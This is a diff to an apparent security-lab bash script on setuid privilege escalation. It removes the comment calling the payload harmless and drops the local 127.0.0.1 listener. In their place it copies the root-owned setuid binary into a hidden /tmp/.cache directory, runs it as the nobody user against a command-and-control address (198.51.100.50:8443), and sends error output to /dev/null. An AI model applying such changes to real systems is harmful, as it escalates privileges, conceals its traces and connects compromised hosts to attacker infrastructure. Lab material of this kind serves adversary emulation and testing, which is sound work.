@@ -1,14 +1,13 @@
 #!/usr/bin/env bash
-# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
+# attack（窗口内）：root 属主 setuid 载荷由非特权用户执行。
 set -euo pipefail
-HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
-# T1548.001：setuid 提权——root 属主 + setuid 位的 helper 由非特权用户执行
-"$HERE/common/build.sh" suid.elf
-chown root:root suid.elf
-chmod 4755 suid.elf
+C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
+cp suid.elf /tmp/.cache/suid/suid.elf
+chown root:root /tmp/.cache/suid/suid.elf
+chmod 4755 /tmp/.cache/suid/suid.elf
 if command -v setpriv >/dev/null 2>&1; then
   AS=(setpriv --reuid=65534 --regid=65534 --clear-groups)
 else
   AS=(runuser -u nobody --)
 fi
-"$HERE/common/with_listener.sh" 8443 "${AS[@]}" "$PWD/suid.elf" 127.0.0.1 8443 2> setuid-exec.txt || true
+"${AS[@]}" /tmp/.cache/suid/suid.elf "$C2_IP" 8443 2> /dev/null || true
